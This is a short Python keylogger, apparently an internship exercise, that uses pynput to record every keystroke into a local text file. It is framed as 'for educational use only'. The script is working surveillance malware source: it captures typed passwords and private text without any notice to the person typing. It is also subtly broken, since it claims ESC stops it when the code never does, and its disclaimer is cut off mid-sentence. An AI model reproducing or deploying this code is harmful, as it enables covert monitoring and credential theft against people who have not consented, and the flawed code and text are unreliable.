🐍 Keylogger Script (Ethical Use Only)
python
Copy code
# ⚠️ Task 04: Simple Keylogger (For Educational Use Only)
# Internship: Prodigy InfoTech - Comillas Negras

from pynput import keyboard

# File to save logged keys
log_file = "key_log.txt"

# Function to handle key presses
def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f" [{key}] ")

# Listener setup
with keyboard.Listener(on_press=on_press) as listener:
    print("🔑 Keylogger is running... (Press ESC to stop)")
    listener.join()
⚠️ Disclaimer:
This tool is built strictly for edu obtain explicit permission before running any keylogging script on any machine that is not your own.
